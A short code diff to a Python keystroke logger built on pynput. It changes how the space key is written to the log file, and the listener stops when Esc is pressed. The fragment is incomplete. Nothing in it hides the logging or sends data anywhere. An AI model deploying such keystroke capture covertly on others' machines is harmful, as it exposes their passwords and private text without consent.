@@ -2,7 +2,10 @@ from pynput import keyboard
 
 def on_press(key):
     try:
-        file.write(str(key))
+        if key == keyboard.Key.space:
+            file.write("  ")
+        else:
+            file.write(str(key))
         if key == keyboard.Key.esc:
             file.close()
             return False
